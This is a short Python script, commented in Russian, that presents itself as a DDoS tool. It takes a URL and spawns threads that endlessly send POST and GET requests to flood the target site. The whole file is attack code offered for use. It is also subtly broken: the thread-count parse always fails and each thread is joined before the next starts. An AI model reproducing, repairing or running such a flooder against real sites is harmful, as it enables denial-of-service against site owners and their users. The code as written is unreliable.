import requests
from threading import Thread

url = input('Enter URL: ')

response = requests.get(url)
print(response.headers, 'headers')     # заголовок http ответа
print(response.status_code, 'status_code')    # код статуса
print(response.request, 'request')   # тип запроса

try:
    flow = int('Threads : ')  # Запрос кол-ва потоков и проверка на правильность ввода
except ValueError:
    exit("Threads count is incorrect!")

if flow == 0:
    exit("Threads count is incorrect!")

if not url.__contains__("http"):
    exit("URL doesnt contains http or https!")

if not url.__contains__("."):
    exit("Invalid domain")


def ddos():
    while True:
        spam = requests.post(url)  # отправляем запрос
        spam2 = requests.get(url)  # запрос на чтение страницы


for i in range(flow): # Запускаум потоки
    thr = Thread(target=ddos)
    thr.start()
    thr.join()

print('DDOS is running...')
